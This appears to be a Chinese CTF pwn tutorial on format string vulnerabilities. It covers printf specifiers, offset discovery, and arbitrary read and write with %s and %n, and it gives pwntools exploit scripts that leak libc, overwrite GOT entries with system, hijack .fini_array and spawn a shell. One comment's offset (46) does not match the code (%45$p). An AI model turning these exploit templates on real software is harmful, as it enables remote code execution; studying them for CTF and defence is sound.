---
title: 格式化字符串漏洞 (Format String)

date: 2026-03-19 10:00:00
tags:
- pwn
- 格式化字符串
- fmtstr
categories:
- PWN
- PWN_ATTACK
- 格式化字符串
---

# 格式化字符串漏洞全面总结

格式化字符串漏洞是 Pwn 中一种极其灵活、威力巨大的漏洞。它不需要栈溢出，只要开发者在使用输出函数时“偷了懒”，攻击者就能利用它实现**任意内存读取**和**任意内存修改**。 

## 基础知识（格式化字符串）：

这里我们了解一下格式化字符串的格式，其基本格式如下

`%[parameter][flags][field width][.precision][length]type`

| 组成部分           | 符号与写法        | 含义与实战场景 (算法/Pwn)                                                                  |
| -------------- | ------------ | --------------------------------------------------------------------------------- |
| **parameter**  | `n$`         | **(Pwn 绝对核心)** 取第 `n` 个参数。例如 `%6$p`                                               |
| **flags**      | `-`          | 左对齐。默认是右对齐，算法竞赛打印矩阵常用。                                                            |
|                | `+`          | 强制显示正负号（正数前加 `+`）。                                                                |
|                | `0`          | 空位用 `0` 填充（默认用空格）。**算法：**打印时间 `09:05` 用 `%02d`；**Pwn：**用 `%012d` 快速造出特定长度的数据。     |
|                | `#`          | 八进制前自动加 `0`，十六进制前自动加 `0x`。                                                        |
| **width**      | `数字`         | 最小输出宽度。例如 `%5d`，即使数字是 1，也会输出 4 个空格 + 1 个 1。                                       |
| **.precision** | `.数字`        | **(算法高频)** 浮点数保留几位小数（会自动四舍五入），如 `%.5f`。如果是给字符串用 `%.5s`，则代表最多只输出 5 个字符。            |
| **length**     | `hh` / `h`   | 修饰长度：`hh` 是单字节 (char)，`h` 是双字节 (short)。**Pwn 中配合 `%n` 极其常用 (`%hhn`)，用于逐字节修改大地址。** |
|                | `l` / `ll`   | 修饰长度：`l` 是 long，`ll` 是 long long。                                                 |
|                | `z`          | 用于 `size_t` 类型数据，在 64 位下等价于无符号 64 位整型。                                            |
| **type**       | `d`/`i`, `u` | 十进制有符号整数 / 无符号整数。                                                                 |
|                | `f`, `lf`    | 浮点数 (`float` 用 `%f`，`double` 用 `%lf`)。                                            |
|                | `x`/`X`, `o` | 16 进制小写/大写，8 进制无符号数。                                                              |
|                | `s`, `c`     | 字符串，单个字符。                                                                         |
|                | `p`          | 打印内存地址指针 (自带 0x 前缀)。**Pwn**用于泄露栈上地址 `%p`。                                         |
|                | `n`          | 不输出字符，而是将**目前为止成功打印的字符总数**，写入对应的指针变量中                                             |

## Pwn 漏洞利用核心组合

在 Pwn 领域，我们把上面的参数像魔法一样组合，化身为内存操控工具。

* **核心组合一：基础读取与参数定位 (`parameter` + `type`)**
  
  * **例子**：`%6$p`
  
  * **实战含义**：直接打印出栈上第 6 个参数的值。这让我们能够越过前面的垃圾数据，精准泄露远处的某一个地址。

* **核心组合二：精准控制写入长度 (`parameter` + `length` + `type`)**
  
  * **例子**：`%8$hhn`
  
  * **实战含义**：向栈上第 8 个参数所指向的地址里，仅仅写入**一个单字节的数据**。由于一次性用 `%n` 写几百万的大数字会导致程序崩溃或等待极长，使用 `%hhn` 逐字节写入是改写大地址的最高端打法。

* **核心组合三：用宽度造数据，用 %n 写内存 (`width` + `parameter` + `n`)**
  
  * **例子**：`%012d%6$n` (结合你的 `w_stack_addr.py` 笔记)
  
  * **执行逻辑**：先执行 `%012d`，强制 `printf` 在屏幕上打印了 12 个字符。紧接着遇到 `%6$n`，`printf` 内部计数器数了一下刚才一共打印了 12 个字符，于是把数字 `12` (即十六进制的 `0xc`) 写入到了第 6 个参数指向的内存地址中。

## 【泄露速查表】到底哪些格式符会“解引用”？

解引用的意味着它把参数当**指针**处理，否则意味着它只把参数当**数值**处理。

| 格式符        | 是否解引用 | 作用原理            | 漏洞利用用途                            |
| ---------- | ----- | --------------- | --------------------------------- |
| **`%s`**   | **是** | 读取指针指向的字符串      | **泄露远端内存内容（如泄露 GOT 表）**           |
| **`%n`**   | **是** | 向指针指向的位置写入总字符数  | **修改内存（如劫持 GOT 表、改判断标志）**         |
| **`%hn`**  | **是** | 同 `%n`，但只写 2 字节 | 精确修改内存 (配合分批写入绕过崩溃)               |
| **`%hhn`** | **是** | 同 `%n`，但只写 1 字节 | **更精确修改内存 (fmtstr_payload的底层核心)** |
| **`%p`**   | **否** | 原样输出指针所在的数值     | **寻找参数偏移**、泄露栈上残留地址               |
| **`%d`**   | **否** | 原样输出整数          | 配合控制输出宽度 (`%012d`) 辅助 `%n` 写数字    |
| **`%x`**   | **否** | 原样输出十六进制        | 同 `%p`，用于寻找参数偏移                   |
| **`%c`**   | **否** | 原样输出字符          | 也是用于控制输出宽度                        |

# 格式化字符串漏洞：

漏洞的根源在于：**程序将用户可控的输入，直接作为了格式化字符串函数的参数。**

**经典漏洞代码：**

```cpp
char buf[100];
read(0, buf, 100);
printf(buf);  // 绝对危险！开发者偷懒没有写 printf("%s", buf);
```

除了 `printf`，这类函数还包括：`sprintf`, `fprintf`, `snprintf`, `vprintf` 等。只要你能控制这些函数的**第一个参数**（格式化字符串），就能触发该漏洞。

**格式化字符串的四种核心用途**:

格式化字符串漏洞可以精准划分为四大实战用途：

## 用途一：泄露栈上数据 / 寻找参数偏移

这是利用漏洞的第一步，通过输入特定的格式符，强迫 `printf` 打印出栈上的内容，从而找到我们输入的 payload 在栈上的第几个参数位置。

**方法**：输入 `AAAA.%x.%x.%x.%x.%x.%x...` 或 `AAAA.%p.%p.%p...`

**原理**：`%x` 或 `%p` 会依次打印出栈上的值。当我们看到输出中出现了 `41414141` (`AAAA` 的十六进制)，数一下它是第几个打印出来的，这就是**偏移量 (offset)**。

**示例**：如果输出是 `deadbeef.0.1.41414141.2.3`，`41414141` 是第 4 个被打印的，说明偏移量就是 `4`。如果你想用 %s 泄露，这里就用 %4$s

## 用途二：读取任意地址内存

找到偏移后，我们可以配合 `%s` 格式符，读取任意给定内存地址里的内容。常用来泄露 libc 基址或 GOT 表真实地址。

**方法**：利用 `%[offset]$s` 格式符。

**实战代码** (`read_stack_data.py` & `r_every_mem.md`)：

```py
# 假设偏移是 6，要泄露 0x0804a020 地址内的数据
# 注意：为了防止 0x0804a020 中的 \x00 截断 printf，地址必须放在后面！
payload = b"%6$saaaa" + p32(0x0804a020) 
io.sendline(payload)
```

## 用途三：改写栈上变量 / 写小数据

利用 `%n` 格式符，`printf` 不仅能“读”，还能“写”。`%n` 会将**目前为止成功打印的字符个数**，写入到对应的指针地址中。

**方法**：构造特定长度的打印输出配合 `%n`。

**实战代码** (`w_stack_addr.py`)：

```py
# 假设我们要把栈上的某个地址修改为数值 16 (0x10)，偏移是 6
# p32 占 4 个字节，%012d 打印 12 个字符，总计 16 个字符。
# 然后遇到 %6$n，就会把 16 写入到 p32(c_addr) 指向的内存中。
payload = p32(c_addr) + b'%012d' + b'%6$n'
```

## 用途四：覆写任意地址 / 劫持 GOT 表获取 Shell

由于一次性打印几百万个字符会导致程序崩溃，所以我们通常利用 pwntools 的大杀器 `fmtstr_payload` 或者按字节分批写入 (`%hhn`)

一般格式化字符串没办法获取shell，但是可以借助got表来**改写printf为system**，再输入/bin/sh即可获取shell。

**劫持 GOT 获取 Shell 实战** (`fmt_getshell.md`)：

```py
from pwn import *
# 1. 计算偏移并获取需要劫持的 GOT 表地址
adr_print_got = elf.got['printf']

# 2. 先利用 %s 泄露 printf 的真实地址，算出 libc 基址和 system 地址
# 假设之前测出偏移量为 6。%7$s 需要凑齐 8 字节对齐，所以加上 aaaa
# 这样 p64(adr_print_got) 就刚刚好落在第 7 个参数的位置
payload_leak = b"%7$saaaa" + p64(adr_print_got)
io.sendline(payload_leak)

# 接收 64 位下的真实地址 (通常为 6 个字节有效地址)，并解包
true_adr_print = u64(io.recvuntil(b'aaaa')[:6].ljust(8, b'\x00'))
print('[+] 泄露的 printf 真实地址:', hex(true_adr_print))

# 用泄露出来的真实地址减去 libc 中 printf 的静态偏移，得到 libc 基址
libc_base = true_adr_print - libc.sym['printf']
print('[+] 计算出的 libc 基址:', hex(libc_base))

# 顺藤摸瓜算出 system 函数的绝对地址
adr_system = libc_base + libc.sym['system']

# 3. 终极奥义：使用 fmtstr_payload 修改 GOT 表
# fmtstr_payload(偏移量, {要修改的目标地址: 修改后的新内容})
payload = fmtstr_payload(6, {adr_print_got: adr_system})
io.sendline(payload)

# 4. 此时 printf 已经变成了 system。再次向程序输入 /bin/sh
# 程序执行 printf("/bin/sh") 实际上变成了 system("/bin/sh")
io.sendline('/bin/sh\x00') 
io.interactive()

```

**`fmtstr_payload` 生成的 Payload 到底有多长？如果程序输入限制在 50 字节以内怎么办？**

* **32位系统下**：大约需要 **40 ~ 50 字节**。

* **64位系统下**：通常需要 **80 ~ 120 字节**！

Pwntools 提供了一个黄金参数：**`write_size='short'`**

```py
# 默认写法 (非常长)：
payload = fmtstr_payload(6, {got: sys})

# 压缩打法 (极大缩短长度)：
payload = fmtstr_payload(6, {got: sys}, write_size='short')
```

## 用途五（进阶）：劫持 .fini_array 实现无限循环 (破除 One-Shot 限制)

**使用场景**：在很多高难度题目中，程序只调用了一次 `printf`，然后就直接 `exit()` 或者 `return 0` 退出了。但是拿 Shell 往往需要**两步**（第一步泄露 libc，第二步劫持 GOT 表）。一次机会怎么做两件事？

**漏洞原理**：在 Linux 的 ELF 可执行文件中，有一个叫 **`.fini_array`** 的段。这里面存放着一个函数指针数组。当 `main` 函数结束，程序准备退出时，系统会自动去遍历执行 `.fini_array` 里面存放的函数（用于清理善后工作）。

**黑客魔法**：既然我们在唯一的一次 `printf` 中拥有任意地址写的能力，我们不仅可以泄露 libc，还可以**同时利用 `%n` 把 `.fini_array` 里的指针，强行改成 `main` 函数的地址！**

**执行后果**： `main` 函数结束 -> 准备退出 -> 查看 `.fini_array` -> 发现里面写着 `main` 的地址 -> **再次执行 main 函数！** 这样，你就硬生生地把一个“只能玩一次”的游戏，变成了一个无限死循环，想输入多少次 payload 就输入多少次

**Pwntools 实战写法：**

```py
# 获取 main 函数的地址
main_addr = elf.symbols['main']
# 获取 .fini_array 的地址 (通常等价于 __do_global_dtors_aux_fini_array_entry)
fini_array_addr = elf.symbols['__do_global_dtors_aux_fini_array_entry'] # 或者直接填 .fini_array 所在的地址

# 在同一次 payload 中，既写 .fini_array 让他循环，又利用 %p 或 %s 泄露 libc
payload = fmtstr_payload(offset, {fini_array_addr: main_addr})
```





## 实战套路：栈残留盲打全流程

这是 AWDP/解题赛中，处理 64 位程序和 One-Shot（只能玩一次）题目的最高效杀招，直接跳过 `%s` 泄露的坑

**什么时候必须去栈上找残留信息来“盲打“**

1. **One-Shot 限制**：程序只有一次 `printf` 机会就直接退出。你必须在同一次 Payload 中完成【泄露】**和**【续命/攻击】，此时无法通过 `%s` 发送目标地址（因为 `\x00` 截断会破坏后面的续命 Payload）。

2. **严格的长度/字符限制**：你的 Payload 容不下手动塞入带有 `\x00` 的大地址去泄露。

### 第一阶段：通过 GDB算偏移

**目标**：在栈底寻找 `__libc_start_main_ret` (或相关启动函数) 的地址，并算出 `%n$p` 偏移。

1. 在 Pwntools 里加上 `gdb.attach(io)` 启动程序。

2. 程序停在 `printf` 前，在 gdb 终端输入 **`stack 50`**。

3. 往下翻，盯住 `0x7f...` 开头的地址，寻找带有 `__libc_start_main` 或 `__libc_start_call_main` 标识的行。
   
   * 示例：`27:0138│+008 0x7fffffffd6f8 —▸ 0x7ffff7c29d90 (__libc_start_call_main+128)`

4. **计算偏移公式**：拿最左边的十六进制序号转成十进制，加上寄存器偏移(例如这里偏移是6)
   
   * 示例：`0x27` = `39`，`39 + 6 = 45`。所以目标偏移是 `%45$p`。

### 第二阶段：算出基址后干什么

1. 拿到 `%45$p` 吐出来的残留地址（如 `0x7ffff7c29d90`）后，减去它在本地 libc 里的静态偏移，得到 **`libc_base` (Libc基址)**。

2. 有了基址，直接算出 **`system_addr = libc_base + libc.sym['system']`**。

3. 发动**第二回合**：利用 `fmtstr_payload`，将 `puts` 或 `printf` 的 GOT 表，直接覆盖为 `system_addr`。

### 一波流打法模板

```py
from pwn import *

# ==================== 环境配置 ====================
elf = ELF('./fmtstr_level2')
libc = ELF('./libc-2.31.so')  # 实战中换成题目提供的 libc
io = process('./fmtstr_level2')
base_offset = 6 # 测出的格式化字符串起点的物理偏移
fini_array = 0x4031F0 # 也可以用 elf.sym['__do_global_dtors_aux_fini_array_entry']
main_addr = elf.sym['main']
# ==================== 回合一：泄露 + 强行续命 ====================
# 1. 假设我们在 gdb 中算出 libc 残留地址在第 46 个参数坑位
# 2. 我们用 %46$paaa 来凑齐 8 个字节 (占 1 个坑位)
# 3. 因为多占了 1 个坑位，后边 fmtstr_payload 的物理起点从 6 顺延变成 7
# 4. %p 输出 "0x7f..." 约 14 个字符，加上 "aaa" 是 17 个字符 (0x11)，所以 numbwritten=0x11
payload1 = b"%45$paaa" + fmtstr_payload(7, {fini_array: main_addr}, numbwritten=0x11)
io.sendlineafter(b"ID\n", payload1) # 根据题目的提示符修改 "ID\n"
# ==================== 基址计算 ====================
io.recvuntil(b"0x")
# 接收紧随 "0x" 之后的 12 个十六进制字符，并转成整数
leaked_libc_addr = int(io.recv(12), 16)
print("[+] 泄露的残留地址:", hex(leaked_libc_addr))
# 减去该函数在 libc 里的相对偏移 (如果报错可用 gdb 看具体的偏移常数)
libc_base = leaked_libc_addr - (libc.sym['__libc_start_main'] + 128)
print("[+] 计算出的 libc_base:", hex(libc_base))
# 顺藤摸瓜找到 system
system_addr = libc_base + libc.sym['system']
# ==================== 回合二：大杀器劫持 GOT ====================
# 程序因为 fini_array 被改，重新回到了 main 函数，此时我们有了一次新机会
# 这次我们直接改 puts 或者 printf 的 GOT 表为 system 的地址
payload2 = fmtstr_payload(6, {elf.got['puts']: system_addr})
io.sendlineafter(b"ID\n", payload2)
# ==================== 终结比赛 ====================
# 程序接下来如果执行 puts("/bin/sh") 或者你的输入，就会执行 system
io.sendline(b'/bin/sh\x00')
io.interactive()
```



# 实战避坑指南

## 架构差异传参坑 (x86 vs x64)

* **x86 (32位)**：参数全部通过栈传递。用 `fmtarg` 工具或 `%x` 可以很直观地看到 payload 直接落在栈上。

* **x64 (64位) ：注意**：前 6 个参数是通过寄存器传递的（`rdi` 放了格式化字符串本身，接下来 5 个参数是 `RSI, RDX, RCX, R8, R9`）。这意味着，**你的 payload 在 x64 下，偏移量至少是 6 起步**（因为前 5 个坑位被寄存器占了）。

## `\x00` 截断坑 (0字节陷阱)

这是初学者最容易死的地方：`printf` 处理字符串时，只要遇到 `\x00` 就会认为字符串结束，直接停止解析

* **64 位下**：`payload = p64(0x401234) + b"%6$s"`。因为 `0x401234` 存为 64 位时是 `\x34\x12\x40\x00\x00\x00\x00\x00`，`printf` 读到第四个字节 `\x00` 就停了，后面的 `%6$s` 根本不会执行

* **正确写法**：必须把包含大量 `\x00` 的内存地址放在 payload 的**最后面**，把格式化符号放前面
  
  ```py
  payload = b"%7$saaaa" + p64(0x401234) # 用 aaaa 对齐 8 字节，地址放最后
  ```
